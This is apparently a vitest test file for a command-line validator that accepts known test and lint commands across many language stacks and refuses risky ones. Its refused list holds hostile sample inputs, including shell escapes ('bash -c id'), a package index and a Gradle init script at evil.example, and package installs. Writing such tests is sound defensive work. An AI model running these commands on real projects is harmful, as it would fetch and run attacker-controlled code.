import { describe, expect, it } from 'vitest';
import { checkArgv, checkNotice } from '../src/guides/checkArgv';

const spec = (line: string) => ({ run: line.split(' ') });

describe('check argv per stack', () => {
  const known = [
    // a wrapper that runs a known check from the project's own environment, never downloading it
    'uv run --frozen pytest -q',
    'uv run --locked ruff check .',
    'uv run --frozen --group dev python -m pytest',
    'uv run --frozen -- mypy src',
    'poetry run pytest',
    'poetry -C services/api run mypy .',
    'pipenv run pytest',
    'bundle exec rspec',
    'bundle exec rubocop',
    'bundle exec rake test',
    'composer exec phpunit',
    'composer test',
    'pnpm exec vitest run',
    'pnpm --filter web exec eslint .',
    'npx --no vitest run',
    'npx --no-install ng test',
    // build tools: tasks among flags
    './gradlew --no-daemon test',
    './gradlew :app:check',
    'gradle -p core build',
    'mvn -B verify',
    './mvnw -B -pl web test',
    'mvn -e spotless:check',
    // workspaces and task runners
    'npm test -w packages/ui',
    'npm -w web run lint',
    'npm --workspace=web test',
    'pnpm --filter web test',
    'pnpm -r run lint',
    'yarn workspace web test',
    'nx run web:test',
    'nx test web',
    'turbo run test',
    'ng test --watch=false',
    // other stacks
    'tox -e py312',
    'nox',
    'isort --check .',
    'mix test',
    'dart test',
    'flutter analyze',
    'php artisan test',
    'vendor/bin/phpunit',
    'rake test',
    'cargo nextest run',
    'deno task check',
    'swiftlint',
    'pint --test',
  ];
  it.each(known)('`%s` is a known check', (line) => {
    expect(checkArgv(spec(line))).toEqual([]);
    expect(checkNotice(spec(line))).toBeUndefined();
  });

  const refused: [line: string, why: RegExp][] = [
    ['uv run pytest', /without --frozen or --locked/],
    ['uv run --frozen --with evil pytest', /--with/],
    ['uv run --frozen --python 3.12 pytest', /--python/],
    ['uv run --frozen --index-url https://evil.example/simple pytest', /--index-url/],
    ['uv run --frozen --directory ../other pytest', /outside the repo/],
    ['uv run --frozen evil-tool', /only a known check/],
    ['uv run --frozen bash -c id', /only a known check/],
    ['uv run --frozen python -cprint(1)', /only a known check/],
    ['uv tool run evil', /downloads/],
    ['poetry run evil', /only a known check/],
    ['poetry -C /tmp run pytest', /outside the repo/],
    ['poetry install', /downloads packages/],
    ['poetry add evil', /downloads packages/],
    ['pipenv install evil', /downloads packages/],
    ['pipenv run sh -c id', /only a known check/],
    ['bundle exec evil', /only a known check/],
    ['bundle exec --gemfile=/tmp/Gemfile rspec', /--gemfile/],
    ['bundle install', /downloads packages/],
    ['bundle exec uv run --frozen pytest', /only a known check/],
    ['composer exec evil', /only a known check/],
    ['composer require evil/pkg', /downloads packages/],
    ['npx vitest', /without --no/],
    ['npx --yes vitest', /--yes/],
    ['npx --no evil', /only a known check/],
    ['pnpm exec evil', /only a known check/],
    ['pnpm --filter web exec sh -c id', /only a known check/],
    ['pnpm dlx evil', /downloads/],
    ['npm -w web install evil', /downloads packages/],
    ['pnpm --filter web add evil', /downloads packages/],
    ['npm --prefix /tmp test', /outside the repo/],
    ['pnpm -C ../other test', /outside the repo/],
    ['./gradlew test --init-script=https://evil.example/x.gradle', /remote address/],
  ];
  it.each(refused)('`%s` is refused', (line, why) => {
    expect(checkArgv(spec(line)).join('; ')).toMatch(why);
  });

  const unknown = [
    'mvn exec:exec',
    'mvn -s ci/settings.xml verify',
    './gradlew --init-script ci/init.gradle test',
    'gradle publish',
    'poetry check',
    'nx exec -- echo',
    // a repo's own bin/ is no tool folder: a program there is known by nothing but its name (programIdentity.ts)
    'bin/rails test',
  ];
  it.each(unknown)('`%s` needs the acknowledgement an unknown program does', (line) => {
    expect(checkArgv(spec(line))).toEqual([]);
    expect(checkNotice(spec(line))).toMatch(/unknown program/);
  });
});
